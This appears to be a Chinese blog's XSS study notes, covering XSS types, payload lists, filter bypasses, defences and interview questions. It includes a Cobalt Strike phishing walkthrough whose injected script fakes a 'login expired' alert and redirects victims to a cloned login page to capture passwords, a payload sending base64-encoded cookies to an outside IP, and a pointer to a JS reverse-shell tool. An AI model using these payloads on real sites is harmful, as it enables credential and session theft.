+<h2 id="cobalt-strike钓鱼"><a href="#cobalt-strike钓鱼" class="headerlink" title="cobalt strike钓鱼"></a>cobalt strike钓鱼</h2><h3 id="CS简介"><a href="#CS简介" class="headerlink" title="CS简介"></a>CS简介</h3><p>这个是常用的团队渗透作战工具，可以实现横向移动，数据窃取，鱼叉式钓鱼的后渗透工具，分为客户端和服务端，一个客户端可以连接多个服务端</p>
+<h3 id="克隆网站"><a href="#克隆网站" class="headerlink" title="克隆网站"></a>克隆网站</h3><p>可以跟着下面的步骤 进行就可以了，我将虚拟机作为服务器win10</p>
+<p>启动cs的克隆网站模式，这里我们克隆dvwa的登录界面，诱使用户点击</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/xss/image-20231209160210299.png" srcset="/img/loading.gif" lazyload alt="image-20231209160210299"></p>
+<p>注意这里不能使用云服务器克隆，因为虚拟机时内网机器，不能被访问到</p>
+<p>我们使用kali克隆</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%8A%80%E6%9C%AF%E9%9A%8F%E7%AC%94/%E9%97%AE%E9%A2%98%E8%AE%B0%E8%BD%BD/image-20231209165153379.png" srcset="/img/loading.gif" lazyload alt="image-20231209165153379"></p>
+<p>可以成功</p>
+<p>然后我们的思路时，当一个用户方访问正常的页面的时候，跳转到了我们的网站，然后他登录这个网站，我们就可以使用CS的输出信息看他的密码了</p>
+<p>下面时使用的payload，将下面的js放入一个sj文件之后，使用连接访问</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-variable language_">window</span>.<span class="hljs-property">alert</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">name</span>)&#123; <span class="hljs-keyword">var</span> iframe = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">&quot;IFRAME&quot;</span>); iframe.<span class="hljs-property">style</span>.<span class="hljs-property">display</span> = <span class="hljs-string">&quot;none&quot;</span>; iframe.<span class="hljs-title function_">setAttribute</span>(<span class="hljs-string">&quot;src&quot;</span>,<span class="hljs-string">&#x27;date:text/plain&#x27;</span>); <span class="hljs-variable language_">document</span>.<span class="hljs-property">documentElement</span>.<span class="hljs-title function_">appendChild</span>(iframe); <span class="hljs-variable language_">window</span>.<span class="hljs-property">frames</span> [<span class="hljs-number">0</span>].<span class="hljs-property">window</span>.<span class="hljs-title function_">alert</span>(name); iframe.<span class="hljs-property">parentNode</span>.<span class="hljs-title function_">removeChild</span>(iframe); &#125; <span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;登陆过期，请重新登陆！&quot;</span>); <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>=<span class="hljs-string">&quot;http://192.168.220.129/&quot;</span><br><br></code></pre></td></tr></table></figure>
+
+<p>再有xss的地方插入</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;script src=<span class="hljs-string">&quot;js文件的地址&quot;</span>&gt;&lt;/script&gt;<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+<h2 id="Beef钓鱼"><a href="#Beef钓鱼" class="headerlink" title="Beef钓鱼"></a>Beef钓鱼</h2><p>beef 是一个xss 利用工具</p>
+<h1 id="流量挟持"><a href="#流量挟持" class="headerlink" title="流量挟持"></a>流量挟持</h1><p>可以理解为，增加自己服务器的浏览量，出入到别人的网站里面</p>
+<h1 id="反射型XSS攻击流程"><a href="#反射型XSS攻击流程" class="headerlink" title="反射型XSS攻击流程"></a>反射型XSS攻击流程</h1><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/xss/image-20231203204136766.png" srcset="/img/loading.gif" lazyload alt="image-20231203204136766"></p>
+<p><strong>反射型XSS：</strong>非持久化，需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内容），<strong>一般容易出现在搜索页面</strong>。反射型XSS大多数是用来盗取用户的Cookie信息</p>
+<p>总结一下：</p>
+<ol>
+<li>发送url，给用户</li>
+<li>点击此链接</li>
+<li>服务器获取请求参数并且直接使用，服务器返回结果页面</li>
+</ol>
+<h1 id="存储型XSS攻击流程"><a href="#存储型XSS攻击流程" class="headerlink" title="存储型XSS攻击流程"></a>存储型XSS攻击流程</h1><p>按照字面意思把XSS放在服务器上</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/xss/image-20231203204249856.png" srcset="/img/loading.gif" lazyload alt="image-20231203204249856"></p>
+<p><strong>存储型XSS：</strong>存储型XSS，持久化，代码是存储在服务器中的，如在<strong>个人信息</strong>或<strong>发表文章</strong>等地方，插入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，用户访问该页面的时候触发代码执行。这种XSS比较危险，容易造成蠕虫，盗窃cookie</p>
+<p><strong>疑惑：</strong>、</p>
+<p>保存到服务器的数据库为什么会被执行？</p>
+<blockquote>
+<p>可以使用评论作为例子，当你使用XSS上传了一段恶意代码之后，这个评论不仅是你可以看到，而是所有的人都可以看到，也就是说前端加载这段代码，才会显示处理。只不过正常的评论是一段字符串，这个是恶意代码而已</p>
+</blockquote>
+<h1 id="DOM"><a href="#DOM" class="headerlink" title="DOM"></a>DOM</h1><p><strong>DOM型XSS：</strong>不经过后端，DOM-XSS漏洞是基于文档对象模型(Document Objeet Model,DOM)的一种漏洞，DOM-XSS是通过url传入参数去控制触发的，其实也属于反射型XSS。</p>
+<p>部分可以触发DOM的JS属性</p>
+<blockquote>
+<p>document.referer   用于记录跳转过来的url<br>window.name         用于记录设置窗口的值，用于页面之间传送时数据，特别是在使用 iframe 或弹出窗口，可以在不同页面之间传递信息或状态<br>location                 是一个对象，代表了当前窗口的url信息。还包含了主机，路径，查询参数等信息<br>innerHTML<br>documen.write       是一个方法，用于动态的向文档中插入内容</p>
+</blockquote>
+<h1 id="XSS攻击的payload"><a href="#XSS攻击的payload" class="headerlink" title="XSS攻击的payload"></a>XSS攻击的payload</h1><h2 id="script标签"><a href="#script标签" class="headerlink" title="script标签"></a>script标签</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;hack&quot;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>   #弹出hack<br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-regexp">/hack/</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>   #弹出hack<br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>        #弹出1，对于数字可以不用引号<br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>      #弹出cookie<br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">http://xxx.com/xss.js</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>  #引用外部的xss<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="SVG标签"><a href="#SVG标签" class="headerlink" title="SVG标签"></a>SVG标签</h2><p>这个标签可以理解为优化的图片的标签</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!-- &lt;svg onload=&quot;alert(1)&quot;&gt;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">&lt;!-- &lt;svg onload=&quot;alert(1)&quot;// </span><br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="img标签"><a href="#img标签" class="headerlink" title="img标签"></a>img标签</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js">onerror  这个是错误处理，可以理解为当程序有问题的时候会触发这个，然后执行里的函数<br>事件在加载外部文件（文档或图像）发生错误时触发。<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span>  <span class="hljs-attr">src</span>=<span class="hljs-string">1</span>  <span class="hljs-attr">οnerrοr</span>=<span class="hljs-string">alert(</span>&quot;<span class="hljs-attr">hack</span>&quot;)&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">img</span>  <span class="hljs-attr">src</span>=<span class="hljs-string">1</span>  <span class="hljs-attr">οnerrοr</span>=<span class="hljs-string">alert(document.cookie)</span>&gt;</span>  #弹出cookie<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="body标签"><a href="#body标签" class="headerlink" title="body标签"></a>body标签</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">οnlοad</span>=<span class="hljs-string">alert(1)</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">οnpageshοw</span>=<span class="hljs-string">alert(1)</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="video标签"><a href="#video标签" class="headerlink" title="video标签"></a>video标签</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">video</span> <span class="hljs-attr">οnlοadstart</span>=<span class="hljs-string">alert(1)</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;/media/hack-the-planet.mp4&quot;</span> /&gt;</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="style标签"><a href="#style标签" class="headerlink" title="style标签"></a>style标签</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">οnlοad</span>=<span class="hljs-string">alert(1)</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="弹窗函数"><a href="#弹窗函数" class="headerlink" title="弹窗函数"></a>弹窗函数</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-title function_">alert</span>()<br><span class="hljs-title function_">confirm</span>()<br><span class="hljs-title function_">prompt</span>()<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;input onfocus=<span class="hljs-title function_">write</span>(<span class="hljs-string">&#x27;xss&#x27;</span>) autofocus&gt; <br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(</span>&#x27;<span class="hljs-attr">xss</span>&#x27;)&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">alert(</span>&#x27;<span class="hljs-attr">xss</span>&#x27;) &gt;</span> </span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;xss&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span> </span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;javascript:alert(&#x27;xss&#x27;)&quot;</span>&gt;</span>clickme<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span> </span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(123456)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span> </span><br><span class="language-xml">&#x27;&gt;<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(123456)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span> </span><br><span class="language-xml">&quot;&gt;<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(123456)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span> </span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(123456)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span> <br>&lt;scrip&lt;script&gt;t&gt;<span class="hljs-title function_">alert</span>(<span class="hljs-number">123456</span>)&lt;<span class="hljs-regexp">/scrip&lt;/</span>script&gt;t&gt; <br>&lt;<span class="hljs-regexp">/div&gt;&lt;script&gt;alert(123456)&lt;/</span>script&gt;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"> <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">open</span>(<span class="hljs-string">&#x27;http://192.168.81.238:2333/?q=&#x27;</span>+<span class="hljs-title function_">btoa</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>)) </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h1 id="XSS插入位置"><a href="#XSS插入位置" class="headerlink" title="XSS插入位置"></a>XSS插入位置</h1><ul>
+<li>用户输入作为<strong>script</strong>标签内容</li>
+<li>用户输入作为HTML<strong>注释内容</strong></li>
+<li>用户输入作为HTML标签的<strong>属性名</strong></li>
+<li>用户输入作为HTML标签的<strong>属性值</strong></li>
+<li>用户输入作为HTML标签的<strong>名字</strong></li>
+<li>直接插入到<strong>CSS</strong>里</li>
+<li>最重要的是，千万不要引入任何不可信的第三方JavaScript到页面里！</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!-- 用户输入注释的时候，我们可以使用闭合执行我们的代码 --&gt;</span><br><span class="hljs-comment">&lt;!-- 用户输入 --&gt;</span><br><span class="hljs-comment">&lt;!-- --&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;hack&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-comment">&lt;!-- --&gt;</span><br><br><span class="hljs-comment">&lt;!-- 用户输入作为标签属性名，导致攻击者可以进行闭合绕过--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">用户输入</span>=<span class="hljs-string">&quot;xx&quot;</span>&gt;</span>  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> &gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;hack&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">a</span>=<span class="hljs-string">&quot;xx&quot;</span>&gt;</span> <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br><span class="hljs-comment">&lt;!-- 用户输入作为标签属性值，导致攻击者可以进行闭合绕过 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;用户输入&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;hack&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">a</span>=<span class="hljs-string">&quot;x&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br><span class="hljs-comment">&lt;!-- 用户输入作为标签名，导致攻击者可以进行闭合绕过 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">用户输入</span>  <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;xx&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;hack&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">b</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;xx&quot;</span> /&gt;</span><br><br><span class="hljs-comment">&lt;!-- 用户输入作为CSS内容，导致攻击者可以进行闭合绕过 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="language-xml">用户输入<span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="language-xml"></span></span><br><span class="language-xml"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span> </span></span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;hack&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span> <span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h1 id="XSS漏洞挖掘"><a href="#XSS漏洞挖掘" class="headerlink" title="XSS漏洞挖掘"></a>XSS漏洞挖掘</h1><h2 id="黑盒测试"><a href="#黑盒测试" class="headerlink" title="黑盒测试"></a>黑盒测试</h2><p>尽可能找到一切用户可控并且能够输出在页面代码中的地方，比如下面这些：</p>
+<ul>
+<li>URL的每一个参数</li>
+<li>URL本身</li>
+<li>表单</li>
+</ul>
+<h2 id="常见业务场景"><a href="#常见业务场景" class="headerlink" title="常见业务场景"></a>常见业务场景</h2><ul>
+<li>重灾区：评论区、留言区、个人信息、订单信息等</li>
+<li>针对型：站内信、网页即时通讯、私信、意见反馈</li>
+<li>存在风险：搜索框、当前目录、图片属性等</li>
+</ul>
+<h2 id="白盒测试-代码审计"><a href="#白盒测试-代码审计" class="headerlink" title="白盒测试(代码审计)"></a>白盒测试(代码审计)</h2><p>关于XSS的代码审计主要就是从接收参数的地方和一些关键词入手。</p>
+<p>看PHP接受参数的方式<code>\$_GET</code>、<code>\$_POST</code>、<code>$_REQUEST</code>，查看每一个接受参数的地方有没有直接输出道页面的，输出到页面中的数据时候进行了过滤和HTML编码的问题</p>
+<p>然后就是需要搜素<code>echo</code>这样的输出语句，跟踪文件从哪里来的，我们能不能控制</p>
+<p>大多数程序会对接收参数封装在公共文件的函数中统一调用，我们就需要审计这些公共函数看有没有过滤，能否绕过</p>
+<h2 id="展示"><a href="#展示" class="headerlink" title="展示"></a>展示</h2><p>主要是使用乌云网</p>
+<ol>
+<li><p>分类</p>
+<blockquote>
+<p>反射型XSS（GET）<br>反射型XSS（POST）<br>存储型XSS<br>DOM型XSS<br>XSS之盲打<br>XSS之过滤<br>XSS之htmlspeclalchars<br>XSS之href输出<br>XSS之js输出</p>
+</blockquote>
+</li>
+<li><p>启维</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2016-0226807">启维主站存在xss | wooyun-2016-0226807| WooYun.org (zone.ci)</a></p>
+</blockquote>
+</li>
+</ol>
+<h1 id="XSS简单绕过"><a href="#XSS简单绕过" class="headerlink" title="XSS简单绕过"></a>XSS简单绕过</h1><h2 id="使用大小写绕过"><a href="#使用大小写绕过" class="headerlink" title="使用大小写绕过"></a>使用大小写绕过</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">scripT</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;hack&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">scripT</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="不区分大小写，过滤之间的所有内容"><a href="#不区分大小写，过滤之间的所有内容" class="headerlink" title="不区分大小写，过滤之间的所有内容"></a>不区分大小写，过滤之间的所有内容</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">1</span> <span class="hljs-attr">οnerrοr</span>=<span class="hljs-string">alert(</span>&#x27;<span class="hljs-attr">hack</span>&#x27;)&gt;</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="超链接"><a href="#超链接" class="headerlink" title="超链接"></a>超链接</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">src</span>=<span class="hljs-string">javascript:alert()</span>&gt;</span>123<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<h1 id="XSS防御"><a href="#XSS防御" class="headerlink" title="XSS防御"></a>XSS防御</h1><p>总体的思路是</p>
+<p>对输入进行url过滤，对输出进行html编码[^html编码]</p>
+<p>这样即使用户输入了脚本，但是并不能运行 </p>
+<p><strong>具体的做法是：</strong></p>
+<ul>
+<li><p>黑名单过滤和白名单过滤</p>
+<blockquote>
+<p>名单过滤虽然可以拦截大部分的XSS攻击，但是还是存在被绕过的风险。白名单过滤虽然可以基本杜绝XSS攻击，但是真实环境中一般是不能进行如此严格的白名单过滤的。</p>
+</blockquote>
+</li>
+<li><p>将输出html编码</p>
+<blockquote>
+<p>#使用htmlspecialchars函数对用户输入的name参数进行html编码，将其转换为html实体<br>$name &#x3D; htmlspecialchars( $_GET[ ‘name’ ] );</p>
+</blockquote>
+</li>
+<li><p>服务端设置Cookie的http only属性，这样一来js脚本就不能直接获取Cookie信息了</p>
+</li>
+</ul>
+<h1 id="使用JS反向shell"><a href="#使用JS反向shell" class="headerlink" title="使用JS反向shell"></a>使用JS反向shell</h1><blockquote>
+<p>git clone <a target="_blank" rel="noopener" href="https://github.com/shelld3v/JSshell.git">https://github.com/shelld3v/JSshell.git</a></p>
+</blockquote>
+<h1 id="XSS利用方式"><a href="#XSS利用方式" class="headerlink" title="XSS利用方式"></a>XSS利用方式</h1><p>注意如果是挖掘src的话，不要使用弹窗！！</p>
+<p>可以使用下面的代码</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-number">1</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>这个需要在F12，开启调试之后才能发现，可以理解为调试的结果，日志输出</p>
+<h1 id="面试相关"><a href="#面试相关" class="headerlink" title="面试相关"></a>面试相关</h1><ol>
+<li><p>XSS 漏洞原理</p>
+<p>本质是js 代码执行，原理就是用户在可控参数输入恶意的js 代码，然后该代码被执行</p>
+</li>
+<li><p>如何验证xss</p>
+<ol>
+<li>寻找用户可控的利用点</li>
+<li>测试特殊符号是否被过滤</li>
+<li>根据第二步及，添加js 事件</li>
+</ol>
+</li>
+<li><p>xss 种类</p>
+<ol>
+<li><p>dom 型</p>
+<p>攻击者将所有的恶意的js 代码，放置于前端，不经过后端</p>
+</li>
+<li><p>反射型</p>
+<p>攻击者将带有恶意的js 传递给网站，经过服务器返回到客户端，然后由客户端的浏览器执行</p>
+</li>
+<li><p>存储型</p>
+<p>将带有恶意的js 代码存放到网站的数据库，然后客户端每一次访问都从数据库读取恶意的js 代码然后执行</p>
+</li>
+<li><p>uxss</p>
+<p>通用型xss</p>
+</li>
+<li><p>mxss</p>
+<p>突变型xss</p>
+</li>
+</ol>
+</li>
+<li><p>xss 有哪些危害？</p>
+<ol>
+<li><p>盗用cookie </p>
+<p>使用http only</p>
+</li>
+<li><p>插入广告</p>
+</li>
+<li><p>盗用身份</p>
+</li>
+<li><p>引流</p>
+</li>
+<li><p>蠕虫攻击</p>
+</li>
+</ol>
+<p>…..</p>
+</li>
+<li><p>怎么防御xss?</p>
+<ol>
+<li>对用户的数据进行限制</li>
+<li>使用黑白名单，进行过滤</li>
+<li>设置http only</li>
+</ol>
+</li>
+<li><p>xss 案例</p>
+<ol>
+<li>2007年12月，百度空间遭受蠕虫攻击，用户之间开始转发垃圾短消息</li>
+<li>2011年新浪微博曾遭受xss攻击（点击链接会自动发送一个连接出去，攻击逐渐扩大，属于蠕虫攻击）</li>
+<li>QQ邮箱发现反射性xss漏洞</li>
+</ol>
+</li>
+<li><p>DOM 型的测试方法</p>
+<p>寻找类似doucument.write、innerHTML赋值、outterHTML赋值、window.location操作、写入javascript：后内容、eval、setTime、setInterval等直接执行之类的函数点<br>思路<br>寻找变量，回溯变量来源是否可控，是否经过安全过滤。</p>
+</li>
+<li><p>修复建议</p>
+<ol>
+<li>对用户的输入进行过滤</li>
+<li>对用户的数据进行html 编码</li>
+<li>对输出的内容进行编码转义</li>
+<li>设置httl only</li>
+</ol>
+</li>
+<li><p>如何绕过xss 的安全限制方法</p>
+<ol>
+<li><p>大小写绕过</p>
+</li>
+<li><p>更换不同的事件</p>
+</li>
+<li><p>超链接</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">src</span>=<span class="hljs-string">javascript:alert()</span>&gt;</span>123<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure></li>
+</ol>
+</li>
+</ol>
+<h1 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h1><blockquote>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_50854790/article/details/124297046">XSS攻击绕过过滤方法大全（转）_xss绕过-CSDN博客</a></p>
+</blockquote>
